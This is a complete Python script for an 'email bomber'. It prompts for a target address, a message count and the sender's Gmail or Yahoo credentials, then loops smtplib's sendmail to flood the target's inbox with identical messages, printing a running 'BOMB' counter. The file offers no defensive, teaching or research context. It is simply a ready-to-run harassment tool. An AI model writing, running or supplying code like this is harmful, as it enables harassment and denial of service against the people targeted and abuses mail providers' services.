import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'



class Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Enter target email <: '))
            self.mode = 1
            if int(self.mode) > int(1) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb]+]+]+')
            self.amount = None
            if self.mode == 1:
                self.amount = int(input(bcolors.GREEN + 'Enter amount of mails to bomb<: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected {self.amount} emails to send ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server- 1:Gmail 2:Yahoo <: '))
            self.port = int(587)
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n
            ''' % (self.fromAddr, self.target, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            while self.amount>0:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count +=1
                self.amount-=1
                print(bcolors.YELLOW + f'BOMB: {self.count}')
            print(bcolors.RED + 'BOMBING COMPLETED')
            self.s.close()
            sys.exit(0)
        except Exception as e:
            print(f'ERROR: {e}')



if __name__=='__main__':
    bomb = Bomber()
    bomb.bomb()
    bomb.email()
    bomb.send()